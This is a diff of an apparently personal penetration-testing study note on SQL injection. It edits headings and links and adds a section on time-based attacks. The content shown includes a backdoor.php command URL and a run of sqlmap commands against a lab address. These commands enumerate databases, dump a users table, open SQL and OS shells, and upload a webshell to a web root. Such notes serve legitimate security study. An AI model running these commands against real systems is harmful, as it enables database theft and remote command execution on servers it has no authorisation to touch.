@@ -1,7 +1,7 @@
 
 Caused by [unsanitized](Unsanitized%20%Data.md) user input being inserted into queries and subsequently passed to a database for execution.  
   
-[sqlmap](sqlmap.md) - SQL Injection scanner & exploitation tool  
+[sqlmap](Tools.md#sqlmap) - SQL Injection scanner & exploitation tool  
   
 Doesn't always have to be w/in form fields - Can also occur within URLs  
 ```sql
@@ -588,50 +588,54 @@ If the above works, we can access the backdoor:
 http://192.168.xxx.10/backdoor.php?cmd=ipconfig
 ```  
   
-# Automation ([sqlmap](sqlmap.md))
+# Automation ([sqlmap](Tools.md#sqlmap))
 
-See if vuln exists: (Can specify parameter w/ **-p**)  
+##### See if vuln exists (Can specify parameter w/ **-p**)
 ```bash
 sqlmap -u "http://192.168.xxx.10/debug.php?id=1"
 ```
 
-Enumerate available databases:  
+##### Enumerate available databases
 ```bash
 sqlmap -u "http://192.168.xxx.10/debug.php?id=1" --dbs
 ```
 
-Enumerate given database's tables:  
+##### Enumerate given database's tables
 ```bash
 sqlmap -u "http://192.168.xxx.10/debug.php?id=1" -D webappdb --tables
 ```
 
-Enumerate given db's table's columns:  
+##### Enumerate given db's table's columns
 ```bash
 sqlmap -u "http://192.168.xxx.10/debug.php?id=1" -D webappdb -T users --columns
 ```
   
-Dump info:  
+##### Dump info
 ```bash
 sqlmap -u "http://192.168.xxx.10/debug.php?id=1" -D webappdb -T users --dump
 ```
   
-Can try for a SQL shell:  
+##### Can try for a SQL shell
 ```bash
 sqlmap -u "http://192.168.xxx.10/debug.php?id=1" --sql-shell
 ```
 
-Or an OS shell:  
+##### Or an OS shell
 ```bash
 sqlmap -u "http://192.168.xxx.10/debug.php?id=1" --os-shell
 ```
 	- Need to choose back-end DBMS (ASP, ASPX, PHP, JSP)  
 	- Will ask “Retrieve command from standard output”. (yes, no, always)  
 
+##### OS Shell & Time-Based attacks
+For time-based attacks, it's not ideal to interact with a shell due to their high latency.
 
-
-
-
-
+1. Intercept the POST request via Burp & save as a local text file on our vm
+2. Invoke **sqlmap** using the **-r** parameter to use the previously saved file & save os-shell to the web-root /tmp directory
+```bash
+sqlmap -r post.txt -p item --os-shell --web-root "/var/www/html/tmp"
+```
+- Once **sqlmap** confirms the vuln, it prompts for the language the webapp is written in, then uploads the webshell to the specified web folter & returns an interactive shell
 
 ### Inaccurate??
 
